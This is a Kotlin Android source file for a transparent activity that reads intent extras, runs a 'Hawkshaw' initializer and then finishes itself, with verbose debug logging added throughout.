package com.hawkshaw.library.activities

import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import com.hawkshaw.library.HawkshawInitializer
import com.hawkshaw.app.R
import com.hawkshaw.library.logger.Logger // Assuming Logger.v is your custom verbose logger

/**
 * Transparent activity for handling initialization
 */
class TransparentActivity : AppCompatActivity() {
    companion object {
        // Use a more specific tag for easier filtering of these new debug logs
        private const val DEBUG_TAG = "TransparentActivity_DEBUG"
        private const val ORIGINAL_TAG = "TransparentActivity" // Keep original for Logger.v
    }

    /**
     * Flag to track if the activity has been resumed before
     */
    private var resumed = false

    /**
     * Action types for the activity
     */
    enum class Action {
        StartHawkshawInitializer
    }

    /**
     * Finish action types for the activity
     */
    enum class FinishAction {
        Finish,
        FinishAffinity
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        Log.d(DEBUG_TAG, "onCreate() called. Intent action: ${intent?.action}")
        intent?.extras?.let { bundle ->
            for (key in bundle.keySet()) {
                Log.d(DEBUG_TAG, "onCreate: Intent Extra: $key = ${bundle.get(key)}")
            }
        } ?: Log.d(DEBUG_TAG, "onCreate: No extras in intent.")

        super.onCreate(savedInstanceState)
        Log.d(DEBUG_TAG, "onCreate: super.onCreate() completed.")
        setContentView(R.layout.activity_transparent)
        Log.d(DEBUG_TAG, "onCreate: setContentView() completed with R.layout.activity_transparent.")

        // Process the intent
        processIntent()
        Log.d(DEBUG_TAG, "onCreate: processIntent() finished.")
    }

    /**
     * Process the intent to determine what action to take
     */
    @RequiresApi(Build.VERSION_CODES.O)
    private fun processIntent() {
        Log.d(DEBUG_TAG, "processIntent() called.")
        val action = intent.action
        // Using original tag for Logger.v as per existing code
        Logger.v(ORIGINAL_TAG, "Processing intent with action: $action", false, 4, null)
        Log.d(DEBUG_TAG, "processIntent: Intent action = $action")

        if (action == Action.StartHawkshawInitializer.name) {
            Log.d(DEBUG_TAG, "processIntent: Action is StartHawkshawInitializer.")
            // Get parameters from intent
            val checkInitFlag = intent.getBooleanExtra("check_init_flag", true)
            val finishActionStr = intent.getStringExtra("finish_action") ?: FinishAction.Finish.name
            Log.d(DEBUG_TAG, "processIntent: checkInitFlag = $checkInitFlag, finishActionStr = $finishActionStr")

            // Initialize Hawkshaw
            Log.d(DEBUG_TAG, "processIntent: Initializing HawkshawInitializer...")
            HawkshawInitializer(this) {
                Log.d(DEBUG_TAG, "processIntent: HawkshawInitializer onFinish callback invoked.")
                // Handle finish action based on parameter
                when (finishActionStr) {
                    FinishAction.FinishAffinity.name -> {
                        Log.d(DEBUG_TAG, "processIntent: HawkshawInitializer onFinish: Calling finishAffinity().")
                        finishAffinity()
                    }
                    else -> {
                        Log.d(DEBUG_TAG, "processIntent: HawkshawInitializer onFinish: Calling finish().")
                        finish()
                    }
                }
            }.init(checkInitFlag)
            Log.d(DEBUG_TAG, "processIntent: HawkshawInitializer.init($checkInitFlag) called.")
        } else {
            Log.d(DEBUG_TAG, "processIntent: Action is not StartHawkshawInitializer or is null. Calling finish().")
            // No valid action, just finish
            finish()
        }
        Log.d(DEBUG_TAG, "processIntent() finished.")
    }

    /**
     * Handle activity resume logic
     */
    override fun onResume() {
        Log.d(DEBUG_TAG, "onResume() called. Current resumed state: $resumed")
        super.onResume()
        Log.d(DEBUG_TAG, "onResume: super.onResume() completed.")

        // Check if the activity should be opened in the foreground
        val openInForeground = intent.getBooleanExtra("OPEN_ACTIVITY_IN_FOREGROUND", false)
        Log.d(DEBUG_TAG, "onResume: OPEN_ACTIVITY_IN_FOREGROUND extra = $openInForeground")

        // If already resumed before, finish the activity
        if (resumed) {
            Log.d(DEBUG_TAG, "onResume: Activity was already resumed. Calling finish().")
            finish()
        }

        // Update resumed state if activity should be opened in foreground
        if (openInForeground) {
            Log.d(DEBUG_TAG, "onResume: openInForeground is true. Setting resumed = true.")
            resumed = true
        }
        Log.d(DEBUG_TAG, "onResume() finished. New resumed state: $resumed")
    }

    override fun finish() {
        Log.d(DEBUG_TAG, "finish() called.")
        super.finish()
    }

    override fun finishAffinity() {
        Log.d(DEBUG_TAG, "finishAffinity() called.")
        super.finishAffinity()
    }

    override fun onDestroy() {
        Log.d(DEBUG_TAG, "onDestroy() called.")
        super.onDestroy()
    }
}
